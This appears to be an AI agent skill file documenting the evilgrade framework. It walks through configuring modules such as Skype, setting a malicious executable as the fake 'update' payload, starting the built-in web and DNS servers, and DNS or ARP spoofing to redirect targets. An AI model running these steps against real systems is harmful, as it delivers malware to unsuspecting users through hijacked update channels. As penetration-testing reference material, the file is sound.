---
name: isr-evilgrade
description: Modular framework for taking advantage of poor upgrade implementations by injecting fake updates. It features a built-in WebServer and DNSServer to deliver malicious payloads to targets when they attempt to update software. Use during penetration testing for client-side exploitation, man-in-the-middle (MITM) attacks, and sniffing/spoofing scenarios.
---

# isr-evilgrade

## Overview
Evilgrade is a modular framework that allows attackers to exploit insecure update mechanisms. It comes with pre-made modules for popular software (Skype, Notepad++, Java, etc.), its own WebServer and DNSServer, and supports custom binary agents. Category: Sniffing & Spoofing / Exploitation.

## Installation (if not already installed)
Assume the tool is installed. If the `evilgrade` command is missing:

```bash
sudo apt update
sudo apt install isr-evilgrade
```

## Common Workflows

### Basic Module Configuration
Start the framework, select a module (e.g., Skype), and start the servers:
```bash
evilgrade
evilgrade> show modules
evilgrade> config skype
evilgrade(skype)> show options
evilgrade(skype)> set agent /path/to/your/payload.exe
evilgrade(skype)> start
```

### DNS Spoofing Integration
Once evilgrade is running, you typically need to redirect the target's traffic to your IP. If using the internal DNS server:
1. Configure the module in evilgrade.
2. Note the "Virtual Host" required by the module (e.g., `ui.skype.com`).
3. Use a tool like `ettercap` or `bettercap` to spoof DNS responses for that host to point to your evilgrade IP.

### Listing Available Modules
To see all supported applications:
```bash
evilgrade> show modules
```

## Complete Command Reference

Evilgrade uses an interactive shell similar to Metasploit.

### Global Commands

| Command | Description |
|---------|-------------|
| `help` | Show help menu |
| `show modules` | List all available update modules (80+ available) |
| `config <module>` | Select and configure a specific module |
| `exit` | Exit the framework |
| `version` | Show version information |

### Module-Specific Commands
Once a module is selected via `config <name>`:

| Command | Description |
|---------|-------------|
| `show options` | Display configurable options for the current module |
| `set <option> <value>` | Set a value for a specific option (e.g., `set agent`, `set port`) |
| `start` | Start the WebServer and DNSServer for the current module |
| `stop` | Stop the active servers |
| `status` | Check if the servers are running |
| `back` | Return to the global prompt |

### Available Modules (Partial List)
Evilgrade includes modules for:
- **Browsers/Web**: `appleupdate`, `itunes`, `safari`, `opera`, `googleanalytics`
- **Communication**: `skype`, `mirc`, `trillian`, `yahoomsn`, `teamspeak`
- **System/Tools**: `winupdate`, `apt`, `cpan`, `cygwin`, `virtualbox`, `vmware`
- **Productivity**: `notepadplus`, `openoffice`, `ccleaner`, `filezilla`, `winscp`
- **Security**: `fsecure_client`, `sunbelt`, `panda_antirootkit`, `clamwin`

## Notes
- **Payloads**: The `agent` option in modules should point to the malicious executable you want the target to download and run as an "update."
- **MITM Required**: This tool is most effective when combined with ARP spoofing or DNS hijacking to ensure the target's update request reaches the Evilgrade server.
- **Virtual Hosts**: Each module has a specific `vhost` (e.g., `update.novell.com`). Ensure your redirection mechanism targets these specific domains.